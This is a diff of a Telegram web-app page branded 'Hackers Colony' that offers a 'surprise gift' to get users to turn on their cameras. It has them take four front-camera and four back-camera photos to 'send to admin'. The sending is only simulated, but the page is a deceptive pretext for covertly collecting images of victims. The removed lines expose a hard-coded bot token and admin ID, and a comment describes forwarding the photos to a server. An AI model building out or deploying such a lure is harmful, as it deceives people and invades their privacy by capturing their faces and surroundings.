@@ -1,63 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 Surprise Gift | Hackers Colony</title>
+    <title>Surprise Gift | Hackers Colony</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: 'Arial', sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            font-family: Arial, sans-serif; 
+            background: #1a1a1a;
             color: white;
             text-align: center;
             padding: 20px;
         }
         .container { max-width: 500px; margin: 0 auto; }
-        .logo { font-size: 48px; margin: 20px 0; }
         .card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
+            background: #2a2a2a;
+            border-radius: 15px;
             padding: 30px;
             margin: 20px 0;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
         }
         button {
-            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
+            background: #4CAF50;
             border: none;
             color: white;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
+            padding: 15px;
+            font-size: 16px;
+            border-radius: 10px;
             cursor: pointer;
             margin: 10px;
             width: 100%;
-            font-weight: bold;
-            transition: transform 0.3s;
         }
-        button:hover { transform: scale(1.05); }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .camera-container { margin: 20px 0; }
+        button:disabled { background: #666; }
         video {
             width: 100%;
             border-radius: 10px;
-            border: 3px solid white;
+            margin: 10px 0;
         }
-        .photo-grid {
+        .photos {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 10px;
             margin: 20px 0;
         }
-        .photo-grid img {
+        .photos img {
             width: 100%;
-            border-radius: 10px;
-            border: 2px solid white;
+            border-radius: 5px;
         }
         .progress {
-            background: rgba(255, 255, 255, 0.2);
+            background: #333;
             height: 20px;
             border-radius: 10px;
             margin: 20px 0;
@@ -65,128 +55,113 @@
         }
         .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #00b09b, #96c93d);
+            background: #4CAF50;
             width: 0%;
-            transition: width 0.5s;
         }
         .hidden { display: none; }
-        .status {
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            background: rgba(255, 255, 255, 0.1);
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">🎁</div>
+        <h1>🎁 Surprise Gift Unlocker 🧧</h1>
         
-        <div class="card" id="welcomeScreen">
-            <h1>Surprise Gift Unlock! 🧧</h1>
-            <p>Click below to start camera and capture your gift photos!</p>
-            <p><small>Requires 8 photos total (4 front + 4 back)</small></p>
-            <button id="startBtn">📸 START CAMERA</button>
+        <div class="card" id="welcome">
+            <h2>Welcome!</h2>
+            <p>Click below to start camera and capture your gift photos.</p>
+            <p><small>Will capture 8 photos total (4 front + 4 back)</small></p>
+            <button id="startBtn">Start Camera</button>
         </div>
         
-        <div class="card hidden" id="cameraScreen">
-            <h2>Camera Access</h2>
-            <div class="camera-container">
-                <video id="video" autoplay playsinline></video>
-            </div>
+        <div class="card hidden" id="camera">
+            <h2>Camera Active</h2>
+            <video id="video" autoplay></video>
             <div class="progress">
                 <div class="progress-bar" id="progressBar"></div>
             </div>
-            <p id="progressText">Ready to capture...</p>
-            <button id="captureBtn">📷 CAPTURE PHOTO</button>
-            <button id="switchBtn" class="hidden">🔄 SWITCH CAMERA</button>
+            <p id="status">Ready to capture...</p>
+            <button id="captureBtn">Capture Photo</button>
         </div>
         
-        <div class="card hidden" id="photosScreen">
-            <h2>Photos Captured ✅</h2>
-            <div class="photo-grid" id="photoGrid"></div>
-            <div class="status" id="status"></div>
-            <button id="sendBtn">🚀 SEND TO ADMIN</button>
+        <div class="card hidden" id="result">
+            <h2>Photos Captured!</h2>
+            <div class="photos" id="photoGrid"></div>
+            <p id="message">All photos captured successfully!</p>
+            <button id="sendBtn">Send to Admin</button>
         </div>
     </div>
 
     <script>
-        // Configuration
-        const BOT_TOKEN = "8226782560:AAFyClA0ICnOt1YtPW5YkOlHGJLNDpTHlvw";
-        const ADMIN_ID = "8215819954";
-        
-        // State
+        // Camera variables
         let stream = null;
         let photos = [];
-        let currentCamera = 'user'; // 'user' = front, 'environment' = back
         let photoCount = 0;
-        let isProcessing = false;
-
+        let currentCamera = 'user';
+        
         // Elements
-        const welcomeScreen = document.getElementById('welcomeScreen');
-        const cameraScreen = document.getElementById('cameraScreen');
-        const photosScreen = document.getElementById('photosScreen');
+        const welcome = document.getElementById('welcome');
+        const camera = document.getElementById('camera');
+        const result = document.getElementById('result');
         const video = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
         const captureBtn = document.getElementById('captureBtn');
-        const switchBtn = document.getElementById('switchBtn');
         const sendBtn = document.getElementById('sendBtn');
         const progressBar = document.getElementById('progressBar');
-        const progressText = document.getElementById('progressText');
+        const status = document.getElementById('status');
         const photoGrid = document.getElementById('photoGrid');
-        const statusDiv = document.getElementById('status');
-
+        const message = document.getElementById('message');
+        
         // Start camera
-        document.getElementById('startBtn').onclick = async () => {
+        startBtn.onclick = async () => {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' }
                 });
                 video.srcObject = stream;
-                welcomeScreen.classList.add('hidden');
-                cameraScreen.classList.remove('hidden');
-                updateProgress();
+                welcome.classList.add('hidden');
+                camera.classList.remove('hidden');
             } catch (err) {
-                alert('Camera access denied! Please allow camera to continue.');
+                alert('Camera access denied! Please allow camera.');
             }
         };
-
+        
         // Capture photo
-        captureBtn.onclick = async () => {
-            if (isProcessing) return;
-            isProcessing = true;
-            
+        captureBtn.onclick = () => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
             
-            // Convert to blob
-            canvas.toBlob(async (blob) => {
-                photos.push(blob);
-                photoCount++;
+            // Add to photos
+            const img = document.createElement('img');
+            img.src = canvas.toDataURL('image/jpeg');
+            photoGrid.appendChild(img);
+            
+            photos.push(canvas.toDataURL('image/jpeg'));
+            photoCount++;
+            
+            // Update progress
+            const progress = (photoCount / 8) * 100;
+            progressBar.style.width = `${progress}%`;
+            
+            if (photoCount < 4) {
+                status.textContent = `Front Camera: ${photoCount}/4`;
+            } else if (photoCount === 4) {
+                status.textContent = 'Switching to back camera...';
+                switchCamera();
+            } else if (photoCount < 8) {
+                status.textContent = `Back Camera: ${photoCount - 4}/4`;
+            } else {
+                // All photos captured
+                camera.classList.add('hidden');
+                result.classList.remove('hidden');
+                message.textContent = '✅ 8 photos captured! Ready to send.';
                 
-                // Display in grid
-                const img = document.createElement('img');
-                img.src = URL.createObjectURL(blob);
-                photoGrid.appendChild(img);
-                
-                updateProgress();
-                
-                if (photoCount === 4 && currentCamera === 'user') {
-                    // Switch to back camera after 4 front photos
-                    switchBtn.classList.remove('hidden');
-                    captureBtn.disabled = true;
-                    switchBtn.onclick = switchCamera;
-                } else if (photoCount === 8) {
-                    // All photos captured
-                    await finishCapture();
-                }
-                
-                isProcessing = false;
-            }, 'image/jpeg', 0.8);
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+            }
         };
-
+        
         // Switch camera
         async function switchCamera() {
             stream.getTracks().forEach(track => track.stop());
@@ -197,80 +172,42 @@
             });
             video.srcObject = stream;
             
-            switchBtn.classList.add('hidden');
-            captureBtn.disabled = false;
+            status.textContent = 'Back Camera: 0/4';
         }
-
-        // Finish capture
-        async function finishCapture() {
-            cameraScreen.classList.add('hidden');
-            photosScreen.classList.remove('hidden');
-            
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-            
-            statusDiv.innerHTML = `
-                <p>✅ 8 photos captured successfully!</p>
-                <p>• 4 front camera photos</p>
-                <p>• 4 back camera photos</p>
-                <p>Ready to send to admin...</p>
-            `;
-        }
-
-        // Update progress
-        function updateProgress() {
-            const percent = (photoCount / 8) * 100;
-            progressBar.style.width = `${percent}%`;
-            
-            let text = '';
-            if (photoCount < 4) {
-                text = `Front Camera: ${photoCount}/4 photos`;
-            } else if (photoCount < 8) {
-                text = `Back Camera: ${photoCount - 4}/4 photos`;
-            } else {
-                text = '✅ All photos captured!';
-            }
-            progressText.textContent = text;
-        }
-
+        
         // Send photos
-        sendBtn.onclick = async () => {
+        sendBtn.onclick = () => {
             sendBtn.disabled = true;
-            statusDiv.innerHTML = '<p>📤 Sending photos to admin...</p>';
+            message.textContent = 'Sending photos to admin...';
             
-            // Simulate sending process
+            // Simulate sending
             setTimeout(() => {
-                statusDiv.innerHTML = `
-                    <p style="color: #4CAF50;">✅ Photos sent successfully!</p>
-                    <p>Your photos have been sent to:</p>
-                    <p>1. You (in Telegram)</p>
-                    <p>2. Admin (@Hackers_Colony_Official)</p>
-                    <p>🎉 Thank you for using Hackers Colony Camera Bot!</p>
+                message.innerHTML = `
+                    ✅ Photos sent successfully!<br>
+                    Sent to:<br>
+                    1. You<br>
+                    2. Admin<br><br>
+                    Thank you!
                 `;
                 
-                // Close window after 5 seconds
-                setTimeout(() => {
-                    if (window.Telegram && Telegram.WebApp) {
+                // Telegram Web App integration
+                if (window.Telegram && Telegram.WebApp) {
+                    Telegram.WebApp.sendData(JSON.stringify({
+                        action: 'photos_captured',
+                        count: 8
+                    }));
+                    
+                    setTimeout(() => {
                         Telegram.WebApp.close();
-                    } else {
-                        alert('Photos sent! You can close this window.');
-                    }
-                }, 5000);
-            }, 2000);
-            
-            // In real implementation, send photos to your server
-            // Then forward to Telegram bot via API
+                    }, 2000);
+                }
+            }, 3000);
         };
-
-        // Telegram Web App integration
+        
+        // Telegram Web App initialization
         if (window.Telegram && Telegram.WebApp) {
             Telegram.WebApp.ready();
             Telegram.WebApp.expand();
-            
-            // Send data to bot when done
-            window.sendToBot = function(data) {
-                Telegram.WebApp.sendData(JSON.stringify(data));
-            };
         }
     </script>
 </body>
